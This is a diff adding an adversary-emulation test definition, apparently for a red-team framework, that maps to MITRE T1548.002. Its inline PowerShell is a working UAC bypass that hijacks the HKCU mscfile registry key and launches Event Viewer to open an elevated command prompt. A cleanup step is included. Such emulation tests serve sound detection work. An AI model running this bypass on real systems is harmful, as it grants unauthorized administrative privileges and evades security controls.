@@ -1,0 +1,32 @@
+api_version: "2.0"
+name: Bypass UAC using Event Viewer (PowerShell)
+description: |
+    PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
+    Upon execution command prompt should be launched with administrative privalages
+args:
+    - name: executable_binary
+      type: path
+      default: C:\Windows\System32\cmd.exe
+uuid: a6ce9acf-842a-4af6-8f79-539be7608e2b
+mitre:
+    tactics:
+        - 'TA0004: Privilege Escalation'
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1548: Abuse Elevation Control Mechanism'
+    subtechniques:
+        - 'T1548.002: Bypass User Account Control'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: bypass-uac-using-event-viewer-(powershell)
+      inline: |
+        New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
+        Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "{{.Args.executable_binary}}" -Force
+        Start-Process "C:\Windows\System32\eventvwr.msc"
+      executor: powershell
+      cleanup:
+        inline: |
+            Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse -ErrorAction Ignore
+        executor: powershell
